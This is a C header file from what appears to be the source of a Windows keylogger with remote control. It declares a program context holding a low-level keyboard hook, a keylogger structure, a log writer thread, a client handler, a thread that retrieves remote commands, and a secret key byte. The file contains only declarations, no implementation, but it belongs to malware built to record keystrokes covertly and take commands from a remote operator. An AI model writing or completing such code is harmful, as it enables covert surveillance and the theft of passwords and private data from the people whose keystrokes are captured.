
#include "utils.h"
#include "../keylogger/keylogger.h"
#include "../client/client.h"

#ifndef PROGRAM_H
#define PROGRAM_H

#define SLP_CMD_THREAD      20000  // 20s
#define SLP_WRITER_THREAD   12500  // 12.5s


/**
 * Structure that maintains all the important information and structures
 * utilised throughout the program
 */
typedef struct {
    CLIENT_HANDLER* client;  // client handler struct
    KEY_LOGGER* kLogger;     // keylogger struct

    DWORD mainThreadId;   // id of the main thread
    HANDLE hWriteThread;  // handle to log writer thread
    HANDLE hCmdThread;    // handle to remote command retrieval worker thread
    HANDLE hMutexThreadSync;   // thread mutex handle
    HHOOK hLowLevelKeyHook;  // lowlevel key hook handle

    BOOL shutdown;  // shutdown flag updated in the commands.c source file
    BOOL sleeping;  // if true, the key events will be skipped

    unsigned char SECRET_KEY;
} PROGRAM_CONTEXT;

extern PROGRAM_CONTEXT* ctx;  // Global program context variable

RET_CODE setup();

RET_CODE startThreads();

void programCleanup();
void programContextCleanup(PROGRAM_CONTEXT* prCon);

#endif